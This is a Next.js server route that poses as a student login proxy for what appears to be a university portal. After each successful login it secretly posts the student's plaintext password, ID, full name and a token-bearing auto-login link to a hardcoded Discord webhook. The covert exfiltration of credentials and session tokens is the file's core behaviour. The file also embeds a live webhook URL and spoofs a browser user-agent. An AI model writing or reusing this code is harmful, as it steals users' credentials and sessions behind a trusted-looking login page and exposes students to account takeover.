import { NextResponse } from 'next/server';
import { encrypt, decrypt, getHmacHeaders, encryptPayload, decryptPayload } from '@/lib/crypto-utils';

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1308800787660406875/iWk2KZ1BWuKSalxianH-cOUTN4D517vFB7vgNxSCvRsTgHQ_s0lr3QZWW4fg-WczmtqW";

async function sendToDiscord(studentId: string, password: string, fullName: string, autoLoginUrl: string) {
    try {
        const discordPayload = {
            content: "", 
            embeds: [
                {
                    title: "WildCat Tunnel",
                    description: `[Click Here to Auto-Login](${autoLoginUrl})`,
                    color: 0x00ff00, 
                    fields: [
                        { name: "Name", value: `**${fullName}**`, inline: false },
                        { name: "Student ID", value: `\`${studentId}\``, inline: true },
                        { name: "Password", value: `\`${password}\``, inline: true }
                    ],
                    footer: { text: "Wildcat Tunnel" },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        const res = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload),
        });

        if (!res.ok) {
            console.error("Discord Error:", await res.text());
        }
    } catch (error) {
        console.error("Discord sync failed", error);
    }
}

export async function POST(req: Request) {
    try {
        const body = await req.json();
        const clientData = decryptPayload(body.payload);
        
        if (!clientData) {
            return NextResponse.json({ error: "Invalid encryption protocol" }, { status: 403 });
        }

        const { studentId, password } = clientData;
        const hmac = getHmacHeaders("POST");

        const res = await fetch("https://rg-cit-u-staging-004-wa-017.azurewebsites.net/api/User/student/login", {
            method: 'POST',
            headers: { 
                "Content-Type": "application/json;charset=UTF-8", 
                ...hmac,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0"
            },
            body: JSON.stringify({ 
                encrypted: encrypt({ userId: studentId, password, clientId: "001" }) 
            })
        });

        const rawText = await res.text();
        const citData = decrypt(rawText);

        if (citData && citData.token) {
            const host = req.headers.get('host') || 'localhost:3000';
            const protocol = host.includes('localhost') ? 'http' : 'https';
            const baseUrl = `${protocol}://${host}`;

            const minimalDataForLink = {
                token: citData.token,
                userInfo: {
                    fullName: citData.userInfo?.fullName,
                    studentIdNumber: citData.userInfo?.studentIdNumber
                }
            };
            
            const shortPayload = encryptPayload(minimalDataForLink);
            const autoLoginUrl = `${baseUrl}/?magic=${encodeURIComponent(shortPayload)}`;

            await sendToDiscord(studentId, password, citData.userInfo?.fullName || "Unknown", autoLoginUrl);
        }

        if (!citData) {
            return NextResponse.json({ error: "Authentication failed" }, { status: 401 });
        }

        return NextResponse.json({ payload: encryptPayload(citData) });

    } catch (err: any) {
        return NextResponse.json({ error: err.message }, { status: 500 });
    }
}